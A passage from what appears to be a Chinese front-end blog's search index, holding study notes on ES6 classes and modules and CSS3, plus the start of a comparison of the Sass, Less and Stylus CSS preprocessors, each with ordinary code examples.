class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class MyArray extends Array &#123; </span><br><span class="line">  constructor(...args) &#123; </span><br><span class="line">    super(...args); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">var arr = new MyArray(); </span><br><span class="line">arr[0] = 12; </span><br><span class="line">arr.length // 1 </span><br><span class="line">arr.length = 0; </span><br><span class="line">arr[0] // undefined</span><br></pre></td></tr></table></figure></p><h3 id="Mixin-模式的实现"><a href="#Mixin-模式的实现" class="headerlink" title="Mixin 模式的实现"></a>Mixin 模式的实现</h3><p>Mixin 模式指的是，将多个类的接口“混入”（mixin）另一个类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function mix(...mixins) &#123; </span><br><span class="line">  class Mix &#123;&#125; </span><br><span class="line">  for (let mixin of mixins) &#123; </span><br><span class="line">    copyProperties(Mix, mixin); </span><br><span class="line">    copyProperties(Mix.prototype, mixin.prototype); </span><br><span class="line">  &#125;</span><br><span class="line">  return Mix; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function copyProperties(target, source) &#123; </span><br><span class="line">  for (let key of Reflect.ownKeys(source)) &#123; </span><br><span class="line">    if ( key !== &quot;constructor&quot; &amp;&amp; key !== &quot;prototype&quot; &amp;&amp; key !== &quot;name&quot; ) &#123;</span><br><span class="line">      let desc = Object.getOwnPropertyDescriptor(source, key); </span><br><span class="line">      Object.defineProperty(target, key, desc); </span><br><span class="line">    &#125; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//使用</span><br><span class="line">class DistributedEdit extends mix(Loggable, Serializable) &#123;&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Module-的语法"><a href="#Module-的语法" class="headerlink" title="Module 的语法"></a>Module 的语法</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>ES6 模块不是对象，而是通过 export 命令显式指定输出的代码，再通过 import 命令输入。</p><p>ES6 模块还有以下好处。</p><ul><li>不再需要 UMD 模块格式了，将来服务器和浏览器都会支持 ES6 模块格式。目前，通过各种工具库，其实已经做到了这一点。 </li><li>将来浏览器的新 API 就能用模块格式提供，不再必须做成全局变量或 者 navigator 对象的属性。 </li><li>不再需要对象作为命名空间（比如 Math 对象），未来这些功能可以通过模块提供。</li></ul><h3 id="export-命令"><a href="#export-命令" class="headerlink" title="export 命令"></a>export 命令</h3><p>如果你希望外部能够读取模块内部的某个变量，就必须使用 export 关键字输出该变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// profile.js </span><br><span class="line">export var firstName = &apos;Michael&apos;; </span><br><span class="line">export var lastName = &apos;Jackson&apos;; </span><br><span class="line">export var year = 1958;</span><br><span class="line"></span><br><span class="line">//or</span><br><span class="line">var firstName = &apos;Michael&apos;; </span><br><span class="line">var lastName = &apos;Jackson&apos;; </span><br><span class="line">var year = 1958; </span><br><span class="line">export &#123;firstName, lastName, year&#125;;</span><br></pre></td></tr></table></figure></p><p>export 命令除了输出变量，还可以输出函数或类（class）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export function multiply(x, y) &#123; </span><br><span class="line">  return x * y; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>通常情况下， export 输出的变量就是本来的名字，但是可以使用 as 关键字重命名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function v1() &#123; ... &#125; </span><br><span class="line">function v2() &#123; ... &#125; </span><br><span class="line">export &#123; </span><br><span class="line">  v1 as streamV1, </span><br><span class="line">  v2 as streamV2, </span><br><span class="line">  v2 as streamLatestVersion </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>export 语句输出的接口，与其对应的值是动态绑定关系，即通过该接口，可以取到模块内部实时的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export var foo = &apos;bar&apos;; </span><br><span class="line">setTimeout(() =&gt; foo = &apos;baz&apos;, 500);</span><br></pre></td></tr></table></figure></p><h3 id="import-命令"><a href="#import-命令" class="headerlink" title="import 命令"></a>import 命令</h3><ul><li>如果想为输入的变量重新取一个名字， import 命令要使用 as 关键字，将输入的变量重命名。</li><li>import 命令接受一对大括号，里面指定要从其他模块导入的变量名。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123; lastName as surname &#125; from &apos;./profile&apos;;</span><br></pre></td></tr></table></figure><ul><li>import 命令具有提升效果，会提升到整个模块的头部，首先执行。</li><li>由于 import 是静态执行，所以不能使用表达式和变量</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 报错 </span><br><span class="line">import &#123; &apos;f&apos; + &apos;oo&apos; &#125; from &apos;my_module&apos;; </span><br><span class="line"></span><br><span class="line">// 报错 </span><br><span class="line">let module = &apos;my_module&apos;; </span><br><span class="line">import &#123; foo &#125; from module; </span><br><span class="line"></span><br><span class="line">// 报错 </span><br><span class="line">if (x === 1) &#123; </span><br><span class="line">  import &#123; foo &#125; from &apos;module1&apos;; </span><br><span class="line">&#125; else &#123; </span><br><span class="line">  import &#123; foo &#125; from &apos;module2&apos;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果多次重复执行同一句 import 语句，那么只会执行一次，而不会执行多次。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import &apos;lodash&apos;; </span><br><span class="line">import &apos;lodash&apos;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="模块的整体加载"><a href="#模块的整体加载" class="headerlink" title="模块的整体加载"></a>模块的整体加载</h3><p>用星号（ * ）指定一个对象，所有输出值都加载在这个对象上面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// circle.js </span><br><span class="line">export function area(radius) &#123; </span><br><span class="line">  return Math.PI * radius * radius; </span><br><span class="line">&#125;</span><br><span class="line">export function circumference(radius) &#123; </span><br><span class="line">  return 2 * Math.PI * radius; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// main.js</span><br><span class="line">import * as circle from &apos;./circle&apos;; </span><br><span class="line">console.log(&apos;圆面积：&apos; + circle.area(4)); </span><br><span class="line">console.log(&apos;圆周长：&apos; + circle.circumference(14));</span><br></pre></td></tr></table></figure></p><h3 id="export-default-命令"><a href="#export-default-命令" class="headerlink" title="export default 命令"></a>export default 命令</h3><ul><li>为模块指定默认输出，其他模块加载该模块时， import 命令可以为该匿名函数指定任意名字。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// export-default.js </span><br><span class="line">export default function () &#123; </span><br><span class="line">  console.log(&apos;foo&apos;); </span><br><span class="line">&#125;</span><br><span class="line">// import-default.js </span><br><span class="line">import customName from &apos;./export-default&apos;; </span><br><span class="line">customName(); // &apos;foo&apos;</span><br></pre></td></tr></table></figure><ul><li>一个模块只能有一个默认输出，因此 export default 命令只能使用一次。</li><li>export default 命令其实只是输出一个叫做 default 的变量，所以它后面不能跟变量声明语句。</li></ul><h3 id="export-与-import-的复合写法"><a href="#export-与-import-的复合写法" class="headerlink" title="export 与 import 的复合写法"></a>export 与 import 的复合写法</h3><p>如果在一个模块之中，先输入后输出同一个模块， import 语句可以与 export 语句写在一起。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export &#123; foo, bar &#125; from &apos;my_module&apos;;</span><br><span class="line">// 接口改名 </span><br><span class="line">export &#123; foo as myFoo &#125; from &apos;my_module&apos;; </span><br><span class="line">// 整体输出 </span><br><span class="line">export * from &apos;my_module&apos;;</span><br></pre></td></tr></table></figure></p><h3 id="模块的继承"><a href="#模块的继承" class="headerlink" title="模块的继承"></a>模块的继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// circleplus.js</span><br><span class="line">export * from &apos;circle&apos;; </span><br><span class="line">export var e = 2.71828182846; </span><br><span class="line">export default function(x) &#123; </span><br><span class="line">  return Math.exp(x); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// main.js </span><br><span class="line">import * as math from &apos;circleplus&apos;; </span><br><span class="line">import exp from &apos;circleplus&apos;; </span><br><span class="line">console.log(exp(math.e));</span><br></pre></td></tr></table></figure><h3 id="跨模块常量"><a href="#跨模块常量" class="headerlink" title="跨模块常量"></a>跨模块常量</h3><p>如果想设置跨模块的常量（即跨多个文件），或者说一个值要被多个模块共享，可以采用下面的写法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// constants.js 模块 </span><br><span class="line">export const A = 1; </span><br><span class="line">export const B = 3; </span><br><span class="line">export const C = 4; </span><br><span class="line"></span><br><span class="line">// test1.js 模块 </span><br><span class="line">import * as constants from &apos;./constants&apos;; </span><br><span class="line">console.log(constants.A); // 1 </span><br><span class="line">console.log(constants.B); // 3</span><br></pre></td></tr></table></figure></p><h3 id="import"><a href="#import" class="headerlink" title="import()"></a>import()</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><ul><li>require 是运行时加载模块， require 到底加载哪一个模块，只有运行时才知道。 import 语句做不到这一点。</li><li>import() 函数，完成动态加载。</li><li>import() 类似于 Node 的 require 方法，区别主要是前者是异步加载，后者是 同步加载。</li><li>import() 返回一个 Promise 对象。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const main = document.querySelector(&apos;main&apos;); </span><br><span class="line">import(`./section-modules/$&#123;someVariable&#125;.js`) </span><br><span class="line">  .then(module =&gt; &#123; </span><br><span class="line">    module.loadPageInto(main); </span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(err =&gt; &#123; </span><br><span class="line">    main.textContent = err.message; </span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><h4 id="适用场合"><a href="#适用场合" class="headerlink" title="适用场合"></a>适用场合</h4><ul><li>按需加载: import() 可以在需要的时候，再加载某个模块。</li><li>条件加载：import() 可以放在 if 代码块，根据不同的情况，加载不同的模块。</li><li>动态的模块路径：import() 允许模块路径动态生成。</li></ul><h2 id="Module-的加载实现"><a href="#Module-的加载实现" class="headerlink" title="Module 的加载实现"></a>Module 的加载实现</h2><h3 id="加载规则"><a href="#加载规则" class="headerlink" title="加载规则"></a>加载规则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;module&quot; src=&quot;foo.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="ES6-模块与-CommonJS-模块的差异"><a href="#ES6-模块与-CommonJS-模块的差异" class="headerlink" title="ES6 模块与 CommonJS 模块的差异"></a>ES6 模块与 CommonJS 模块的差异</h3><ul><li>CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。</li><li>CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。</li></ul><h3 id="Node-加载"><a href="#Node-加载" class="headerlink" title="Node 加载"></a>Node 加载</h3><ul><li>在 Node 环境中，使用 import 命令加载 CommonJS 模块，Node 会自动将 module.exports 属性，当作模块的默认输出，即等同于 export default 。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// a.js </span><br><span class="line">module.exports = &#123; </span><br><span class="line">  foo: &apos;hello&apos;, </span><br><span class="line">  bar: &apos;world&apos; </span><br><span class="line">&#125;;</span><br><span class="line">// 等同于 </span><br><span class="line">export default &#123; </span><br><span class="line">  foo: &apos;hello&apos;, </span><br><span class="line">  bar: &apos;world&apos; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>采用 require 命令加载 ES6 模块时，ES6 模块的所有输出接口，会成为输入对象的属性。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// es.js </span><br><span class="line">export let foo = &#123;bar:&apos;my-default&apos;&#125;; </span><br><span class="line">export &#123;foo as bar&#125;; </span><br><span class="line">export function f() &#123;&#125;; </span><br><span class="line">export class c &#123;&#125;; </span><br><span class="line"></span><br><span class="line">// cjs.js </span><br><span class="line">const es_namespace = require(&apos;./es&apos;); </span><br><span class="line">// es_namespace = &#123; </span><br><span class="line">//   get foo() &#123;return foo;&#125; </span><br><span class="line">//   get bar() &#123;return foo;&#125; </span><br><span class="line">//   get f() &#123;return f;&#125; </span><br><span class="line">//   get c() &#123;return c;&#125; </span><br><span class="line">// &#125;</span><br></pre></td></tr></table></figure><h3 id="循环加载"><a href="#循环加载" class="headerlink" title="循环加载"></a>循环加载</h3><p>“循环加载”（circular dependency）指的是， a 脚本的执行依赖 b 脚本，而 b 脚本的执行又依赖 a 脚本。</p><h4 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h4><p>CommonJS 模块的重要特性是加载时执行，即脚本代码在 require 的时候，就会全部执行。一旦出现某个模块被”循环加载”，就只输出已经执行的部分，还未执行的部分不会输出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// a.js</span><br><span class="line">exports.done = false; </span><br><span class="line">var b = require(&apos;./b.js&apos;); </span><br><span class="line">console.log(&apos;在 a.js 之中，b.done = %j&apos;, b.done); </span><br><span class="line">exports.done = true; </span><br><span class="line">console.log(&apos;a.js 执行完毕&apos;);</span><br><span class="line"></span><br><span class="line">// b.js</span><br><span class="line">exports.done = false; </span><br><span class="line">var a = require(&apos;./a.js&apos;); </span><br><span class="line">console.log(&apos;在 b.js 之中，a.done = %j&apos;, a.done); </span><br><span class="line">exports.done = true; </span><br><span class="line">console.log(&apos;b.js 执行完毕&apos;);</span><br><span class="line"></span><br><span class="line">// main.js</span><br><span class="line">var a = require(&apos;./a.js&apos;); </span><br><span class="line">var b = require(&apos;./b.js&apos;); </span><br><span class="line">console.log(&apos;在 main.js 之中, a.done=%j, b.done=%j&apos;, a.done, b.do ne);</span><br><span class="line"></span><br><span class="line">$ node main.js </span><br><span class="line"></span><br><span class="line">在 b.js 之中，a.done = false </span><br><span class="line">b.js 执行完毕 </span><br><span class="line">在 a.js 之中，b.done = true </span><br><span class="line">a.js 执行完毕 </span><br><span class="line">在 main.js 之中, a.done=true, b.done=true</span><br></pre></td></tr></table></figure></p><h4 id="ES6-模块"><a href="#ES6-模块" class="headerlink" title="ES6 模块"></a>ES6 模块</h4><p>ES6加载的变量，都是动态引用 其所在的模块。只要引用存在，代码就能执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// even.js</span><br><span class="line">import &#123; odd &#125; from &apos;./odd&apos; </span><br><span class="line">export var counter = 0; </span><br><span class="line">export function even(n) &#123; </span><br><span class="line">  counter++; </span><br><span class="line">  return n == 0 || odd(n - 1); </span><br><span class="line">&#125;</span><br><span class="line">// odd.js </span><br><span class="line">import &#123; even &#125; from &apos;./even&apos;; </span><br><span class="line">export function odd(n) &#123; </span><br><span class="line">  return n != 0 &amp;&amp; even(n - 1); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ babel-node &gt; import * as m from &apos;./even.js&apos;; </span><br><span class="line">&gt; m.even(10); </span><br><span class="line">true </span><br><span class="line">&gt; m.counter </span><br><span class="line">6</span><br><span class="line">&gt; m.even(20) </span><br><span class="line">true </span><br><span class="line">&gt; m.counter </span><br><span class="line">17</span><br></pre></td></tr></table></figure></p><h3 id="ES6模块的转码"><a href="#ES6模块的转码" class="headerlink" title="ES6模块的转码"></a>ES6模块的转码</h3><p>它是一个垫片库（polyfill），可以在浏览器内加载 ES6 模块、AMD 模块和 CommonJS 模块，将其转为 ES5 格式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;system.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt; </span><br><span class="line">  System.import(&apos;./app.js&apos;); </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JS </tag>
            
            <tag> ES6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS3知识点梳理</title>
      <link href="/CSS3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86.html"/>
      <url>/CSS3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86.html</url>
      
        <content type="html"><![CDATA[<p>本文对CSS3核心知识点，做了思维导图，便于记忆梳理。</p><a id="more"></a><p><img src="../assets/20190831/css3.png" alt="Alt text"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SASS,LESS,Stylus哪家强</title>
      <link href="/SASS-LESS-Stylus%E5%93%AA%E5%AE%B6%E5%BC%BA.html"/>
      <url>/SASS-LESS-Stylus%E5%93%AA%E5%AE%B6%E5%BC%BA.html</url>
      
        <content type="html"><![CDATA[<p>俗话说得好，“人靠衣装，佛靠金装”，对于一个页面来说，美观与否，CSS起着重大的作用，而随着越来越多的使用，CSS也暴露出不少缺陷：</p><ul><li>语法不够强大，比如无法嵌套书写导致模块化开发中需要书写很多重复的选择器</li><li>没有变量和合理的样式复用机制，使得逻辑上相关的属性值必须以字面量的形式重复输出，导致难以维护</li></ul><p>于是，CSS预处理器就诞生了。CSS预处理器用一种专门的编程语言，进行Web页面样式设计，然后再编译成正常的CSS文件，以供项目使用。CSS预处理器为CSS增加一些编程的特性，无需考虑浏览器的兼容性问题。<br>本文将主要介绍 Sass、Less 和 Stylus 这三种 css 预处理器，并比较分析他们的区别。</p><a id="more"></a><h2 id="Sass-Scss、Less、stylus是什么"><a href="#Sass-Scss、Less、stylus是什么" class="headerlink" title="Sass/Scss、Less、stylus是什么?"></a>Sass/Scss、Less、stylus是什么?</h2><ul><li>Sass：Sass是一种动态样式语言，语法属于缩排语法，是最早也是最成熟的CSS预处理器，拥有ruby社区的支持和compass这一最强大的css框架，目前受LESS影响，已经进化到了全面兼容CSS的SCSS。</li><li>Less：Less也是一种动态样式语言. 受Sass影响较大,对CSS赋予了动态语言的特性，如变量，继承，运算， 函数。Less既可以在客户端上运行 (支持IE 6+, Webkit, Firefox)，也可在服务端运行(借助 Node.js)。</li><li>Stylus：2010年产生于node社区， 主要用来给Node项目进行CSS预处理支持，人气不如前两者Stylus被称为是一种革命性的新语言，提供一个高效、动态、和使用表达方式来生成CSS，以供浏览器使用。Stylus同时支持缩进和CSS常规样式书写规则。需要安装nodeStylus的语法花样多一些，它的文件扩展名是“.styl”，Stylus也接受标准的CSS语法，但是他也像Sass老的语法规则，使用缩进控制，同时Stylus也接受不带大括号({})和分号的语法。</li></ul><h2 id="Sass-Scss、Less、stylus的区别"><a href="#Sass-Scss、Less、stylus的区别" class="headerlink" title="Sass/Scss、Less、stylus的区别"></a>Sass/Scss、Less、stylus的区别</h2><h3 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h3><p>Sass的安装需要Ruby环境，是在服务端处理的，而Less是需要引入less.js来处理Less代码输出css到浏览器，也可以在开发环节使用Less，然后编译成css文件，直接放到项目中，也有 Less.app、SimpleLess、CodeKit.app这样的工具，也有在线编译地址。Stylus需要安装node，然后安装最新的stylus包即可使用。</p><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><h4 id="Sass"><a href="#Sass" class="headerlink" title="Sass"></a>Sass</h4><p>变量以 <code>$</code> 符号开始，赋值像设置CSS属性那样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$width: 5em;</span><br><span class="line">#main &#123;</span><br><span class="line">  width: $width;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#main &#123;</span><br><span class="line">  width: 5em;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>变量支持块级作用域，嵌套规则内定义的变量只能在嵌套规则内使用（局部变量），不在嵌套规则内定义的变量则可在任何地方使用（全局变量）。将局部变量转换为全局变量可以添加 !global 声明。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#main &#123;</span><br><span class="line">  $width: 5em !global;</span><br><span class="line">  width: $width;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#sidebar &#123;</span><br><span class="line">  width: $width;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#main &#123;</span><br><span class="line">  width: 5em;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#sidebar &#123;</span><br><span class="line">  width: 5em;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h4><p>变量以 <code>@</code> 符号开始，赋值像设置CSS属性那样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@width: 10px;</span><br><span class="line">@height: @width + 10px;</span><br><span class="line"></span><br><span class="line">#header &#123;</span><br><span class="line">  width: @width;</span><br><span class="line">  height: @height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#header &#123;</span><br><span class="line">  width: 10px;</span><br><span class="line">  height: 20px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>变量是延迟加载的，在使用前不一定要预先声明。在定义一个变量两次时，只会使用最后定义的变量，Less会从当前作用域中向上搜索。这个行为类似于CSS的定义中始终使用最后定义的属性值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@var: 0;</span><br><span class="line">.class &#123;</span><br><span class="line">  @var: 1;</span><br><span class="line">  .brass &#123;</span><br><span class="line">    @var: 2;</span><br><span class="line">    three: @var;</span><br><span class="line">    @var: 3;</span><br><span class="line">  &#125;</span><br><span class="line">  one: @var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.class &#123;</span><br><span class="line">  one: 1;</span><br><span class="line">&#125;</span><br><span class="line">.class .brass &#123;</span><br><span class="line">  three: 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Stylus"><a href="#Stylus" class="headerlink" title="Stylus"></a>Stylus</h4><p>没有特殊的要求,可以使用 <code>$</code> 符号开头。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">font-size = 14px</span><br><span class="line">font = font-size &quot;Lucida Grande&quot;, Arial</span><br><span class="line">body</span><br><span class="line">  font font, sans-serif</span><br></pre></td></tr></table></figure></p><p>编译为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  font: 14px &quot;Lucida Grande&quot;, Arial, sans-serif;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="插值语句"><a href="#插值语句" class="headerlink" title="插值语句"></a>插值语句</h3><h4 id="Sass-1"><a href="#Sass-1" class="headerlink" title="Sass"></a>Sass</h4><p>通过 <code>#{}</code> 插值语句可以在选择器或属性名中使用变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$name: 